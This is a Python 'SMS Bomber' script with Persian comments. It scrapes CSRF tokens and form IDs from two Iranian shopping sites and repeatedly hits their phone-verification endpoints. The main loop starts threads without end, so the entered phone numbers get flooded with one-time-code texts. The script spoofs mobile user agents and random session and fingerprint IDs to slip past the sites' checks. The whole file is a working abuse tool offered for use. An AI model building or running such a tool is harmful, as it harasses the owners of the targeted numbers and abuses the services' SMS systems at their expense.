import requests
import re
import uuid
from threading import Thread
from time import sleep
import socket
import urllib3

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# بررسی اتصال اینترنت
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# تابع vitrin_shop
def vitrin_shop(phone):
    formatted_phone = "0" + re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    def get_fresh_token():
        try:
            session = requests.Session()
            home_response = session.get("https://www.vitrin.shop/", timeout=10, headers={
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
            })
            home_response.encoding = 'utf-8'
            if 'XSRF-TOKEN' in session.cookies:
                return session.cookies['XSRF-TOKEN']
            token_patterns = [
                r'name="_token" content="([^"]+)"',
                r'name="csrf-token" content="([^"]+)"',
                r'XSRF-TOKEN=([^;]+)',
            ]
            for pattern in token_patterns:
                match = re.search(pattern, home_response.text)
                if match:
                    return match.group(1)
            return None
        except Exception as e:
            print(f'{r}[!] get_fresh_token Exception: {e}{a}')
            return None

    try:
        fresh_token = get_fresh_token()
        url = "https://www.vitrin.shop/api/v1/user/request_code"
        payload = {
            "phone_number": formatted_phone,
            "forgot_password": False
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "V-Session-ID": str(uuid.uuid4()),
            "V-Fingerprint-ID": str(uuid.uuid4()),
            "X-XSRF-TOKEN": fresh_token if fresh_token else "default-token",
            "Origin": "https://www.vitrin.shop",
            "Referer": "https://www.vitrin.shop/",
        }
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        response.encoding = 'utf-8'
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success", False):
                    print(f'{g}(vitrin_shop) {a}Code Sent to {phone}')
                    return True
                else:
                    print(f'{r}[-] (vitrin_shop) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
                    return False
            except ValueError as e:
                print(f'{r}[-] JSON Decode Error for {phone}: {e}{a}')
                return False
        print(f'{r}[-] (vitrin_shop) HTTP Error for {phone}: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] vitrin_shop Exception for {phone}: {e}{a}')
        return False

# تابع ilozi
def ilozi(phone):
    digits_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
    try:
        session = requests.Session()
        home_response = session.get("https://ilozi.com/?login=true&page=2", timeout=10, headers={
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
        })
        home_response.encoding = 'utf-8'
        instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
        instance_id = instance_id.group(1) if instance_id else "6fb17492e0d343df4e533a9deb8ba6b9"
        digits_form = re.search(r'name="digits_form" value="([a-f0-9]+)"', home_response.text)
        digits_form = digits_form.group(1) if digits_form else "3780032f76"
        url = "https://ilozi.com/wp-admin/admin-ajax.php"
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": digits_phone,
            "action_type": "phone",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "digits": "1",
            "instance_id": instance_id,
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
            "digits_form": digits_form,
            "_wp_http_referer": "/?login=true&page=2",
            "show_force_title": "1",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://ilozi.com",
            "Referer": "https://ilozi.com/?login=true&page=2",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        response.encoding = 'utf-8'
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success"):
                    print(f'{g}(ilozi) {a}Code Sent to {phone}')
                    return True
                else:
                    print(f'{r}[-] (ilozi) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
                    return False
            except ValueError:
                if response.text.strip() == "1":
                    print(f'{g}(ilozi) {a}Code Sent to {phone}')
                    return True
        print(f'{r}[-] (ilozi) HTTP Error for {phone}: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] ilozi Exception for {phone}: {e}{a}')
        return False

# تابع ارسال ایمن سرویس‌ها
def send_service_safe(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")

# تابع اصلی SMS Bomber
def vip(phones, delay=0.1):
    services = [vitrin_shop, ilozi]
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# اعتبارسنجی شماره‌های تلفن
def is_phone(phone_input: str):
    phones = phone_input.split('-')  # جدا کردن شماره‌ها با خط فاصله
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# منوی اصلی
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║         SMS Bomber by M.M.]R               ║
{y}╚════════════════════════════════════════════╝
{g} Coded by: {r}M.M.]R{a}
{y}══════════════════════════════════════════════
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# نقطه ورود
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        
        vip(phones, delay)
